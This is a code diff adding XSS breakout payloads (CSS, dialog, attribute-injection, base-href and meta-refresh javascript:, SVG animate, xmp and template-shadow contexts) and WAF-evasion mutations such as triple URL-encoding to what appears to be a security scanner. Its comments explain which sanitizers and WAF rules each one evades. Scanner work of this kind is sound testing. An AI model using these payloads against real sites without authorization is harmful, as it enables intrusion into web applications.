@@ -188,6 +188,97 @@ PAYLOAD_VARIANTS = {
         '"><style>@import url(<dXsS>)</style>',
         '<style>@import url(<dXsS>)</style>',
     ),
+
+    # Phase 1.2 milestone 3 additions ---------------------------------------
+
+    # CSS-context breakouts. Payload lands inside a style attribute or a
+    # <style> block; needs to close the current CSS syntactic construct.
+    "style-value-breakout": (
+        ';background:url(<dXsS>);',
+        ';background:url(<dXsS>);',
+    ),
+    "css-comment-breakout": (
+        '*/<dXsS>',
+        '*/<dXsS>',
+    ),
+    "css-import-breakout": (
+        ');<dXsS>',
+        ');<dXsS>',
+    ),
+
+    # HTML5 dialog element. Post-2022 additions; older sanitizers do not
+    # know about oncancel / onbeforetoggle attributes.
+    "dialog-onbeforetoggle-breakout": (
+        '"><dialog open onbeforetoggle=1><dXsS></dialog>',
+        '<dialog open onbeforetoggle=1><dXsS></dialog>',
+    ),
+    "dialog-oncancel-breakout": (
+        '"><dialog open oncancel=1><dXsS></dialog>',
+        '<dialog open oncancel=1><dXsS></dialog>',
+    ),
+
+    # Attribute-list injection. Stays INSIDE the current tag by opening one
+    # attribute and appending a handler + a swallow-comment. Different
+    # mechanism from attr-breakout (which escapes the tag entirely) - many
+    # sanitizers block `>` but allow bare `"`.
+    "attr-inject-onerror-breakout": (
+        '" onerror=1//',
+        '" onerror=1//',
+    ),
+    "attr-inject-onmouseover-breakout": (
+        '" onmouseover=1//',
+        '" onmouseover=1//',
+    ),
+
+    # URL-context tags that hijack navigation. `<base href=javascript:>`
+    # rewrites every subsequent relative URL. `<meta http-equiv=refresh>`
+    # navigates automatically.
+    "base-href-javascript-breakout": (
+        '"><base href=javascript:1//><dXsS>',
+        '<base href=javascript:1//><dXsS>',
+    ),
+    "meta-refresh-breakout": (
+        '"><meta http-equiv=refresh content=0;url=javascript:1><dXsS>',
+        '<meta http-equiv=refresh content=0;url=javascript:1><dXsS>',
+    ),
+
+    # SVG-namespace event handlers beyond onload. animate/set can fire
+    # without user interaction.
+    "svg-animate-onbegin-breakout": (
+        '"><svg><animate onbegin=1><dXsS></svg>',
+        '<svg><animate onbegin=1><dXsS></svg>',
+    ),
+
+    # Media surface complement to video-source-breakout.
+    "audio-onerror-breakout": (
+        '"><audio><source onerror=1></audio><dXsS>',
+        '<audio><source onerror=1></audio><dXsS>',
+    ),
+
+    # Legacy tags still parsed by every mainstream browser. Some allowlist
+    # sanitizers explicitly bless <xmp> as "safe pre-formatted text",
+    # forgetting that anything AFTER </xmp> re-enters normal parsing.
+    "xmp-breakout": (
+        '</xmp><dXsS>',
+        '</xmp><dXsS>',
+    ),
+
+    # JS-context complements.
+    "js-regex-breakout": (
+        '/;<dXsS>//',
+        '<dXsS>',
+    ),
+    "js-comment-close-breakout": (
+        '*/<dXsS>',
+        '*/<dXsS>',
+    ),
+
+    # HTML5 template/slot. Web Components content boundary; some
+    # sanitizers stop at <template> and leave its shadow tree unscrubbed.
+    "template-shadow-breakout": (
+        '"><template shadowrootmode=open><script>1</script></template><dXsS>',
+        '<template shadowrootmode=open><script>1</script></template><dXsS>',
+    ),
 }
 
 
@@ -244,6 +335,28 @@ _WAF_MUTATIONS = [
     # exactly; a trailing backslash breaks the pattern but a lenient
     # HTML parser reforms the tag.
     ("backslash-tag",     lambda s: s.replace('<dXsS>', '<dXsS\\>')),
+
+    # Phase 1.2 milestone 3 additions --------------------------------------
+
+    # Space + tab combo. A few WAF regexes normalise \s but stop at the
+    # first whitespace class match; a mixed run confuses length-based rules.
+    ("space-tab-mix",     lambda s: s.replace('<dXsS>', '<dXsS \t>')),
+
+    # Triple URL-encode. For reverse-proxy chains where each hop decodes
+    # once. Rare but exists in enterprise stacks with three-tier ingress.
+    ("triple-url-encode", lambda s: s.replace('<dXsS>', '%25253CdXsS%25253E')),
+
+    # Lowercase percent-hex. Some WAF signatures anchor uppercase (`%3C`)
+    # only; the RFC allows either case and browsers accept both.
+    ("percent-lowercase", lambda s: s.replace('<dXsS>', '%3cdXsS%3e')),
+
+    # Comment split AFTER the tag name (not inside). Distinct from split-cmt
+    # because the WAF regex might tolerate that position differently.
+    ("split-cmt-suffix",  lambda s: s.replace('<dXsS>', '<dXsS<!---->>')),
+
+    # CR + space combined. Belt-and-suspenders whitespace variant that
+    # some CRS rules explicitly do NOT normalise together.
+    ("cr-space-mix",      lambda s: s.replace('<dXsS>', '<dXsS\r >')),
 ]
 
 
